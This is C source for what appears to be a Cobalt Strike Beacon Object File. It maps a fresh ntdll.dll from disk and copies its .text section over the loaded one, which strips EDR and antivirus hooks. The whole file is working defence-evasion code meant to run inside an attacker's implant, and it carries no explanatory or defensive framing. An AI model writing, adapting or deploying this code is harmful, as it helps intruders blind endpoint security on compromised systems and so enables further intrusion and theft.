#include <windows.h>
#include "beacon.h"
void go(char *args, int alen) {
    (void)args; (void)alen;
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { BeaconPrintf(CALLBACK_ERROR, "[!] Cannot open ntdll.dll\n"); return; }
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return; }
    LPVOID freshNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!freshNtdll) { CloseHandle(hMap); CloseHandle(hFile); return; }
    PIMAGE_DOS_HEADER freshDos = (PIMAGE_DOS_HEADER)freshNtdll;
    PIMAGE_NT_HEADERS freshNt = (PIMAGE_NT_HEADERS)((BYTE *)freshNtdll + freshDos->e_lfanew);
    PIMAGE_SECTION_HEADER freshSec = IMAGE_FIRST_SECTION(freshNt);
    LPVOID freshTextStart = NULL; DWORD freshTextSize = 0;
    for (DWORD i = 0; i < freshNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(freshSec[i].Name, ".text", 5) == 0) { freshTextStart = (BYTE *)freshNtdll + freshSec[i].VirtualAddress; freshTextSize = freshSec[i].Misc.VirtualSize; break; }
    }
    if (!freshTextStart) { UnmapViewOfFile(freshNtdll); CloseHandle(hMap); CloseHandle(hFile); return; }
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER hookedDos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS hookedNt = (PIMAGE_NT_HEADERS)((BYTE *)hNtdll + hookedDos->e_lfanew);
    PIMAGE_SECTION_HEADER hookedSec = IMAGE_FIRST_SECTION(hookedNt);
    LPVOID hookedTextStart = NULL;
    for (DWORD i = 0; i < hookedNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(hookedSec[i].Name, ".text", 5) == 0) { hookedTextStart = (BYTE *)hNtdll + hookedSec[i].VirtualAddress; break; }
    }
    if (!hookedTextStart) { UnmapViewOfFile(freshNtdll); CloseHandle(hMap); CloseHandle(hFile); return; }
    DWORD oldProtect = 0;
    if (!VirtualProtect(hookedTextStart, freshTextSize, PAGE_READWRITE, &oldProtect)) { UnmapViewOfFile(freshNtdll); CloseHandle(hMap); CloseHandle(hFile); return; }
    RtlMoveMemory(hookedTextStart, freshTextStart, freshTextSize);
    if (VirtualProtect(hookedTextStart, freshTextSize, PAGE_EXECUTE_READ, &oldProtect))
        FlushInstructionCache(GetCurrentProcess(), hookedTextStart, freshTextSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll.dll unhooked — restored %lu bytes\n", (unsigned long)freshTextSize);
    UnmapViewOfFile(freshNtdll); CloseHandle(hMap); CloseHandle(hFile);
}
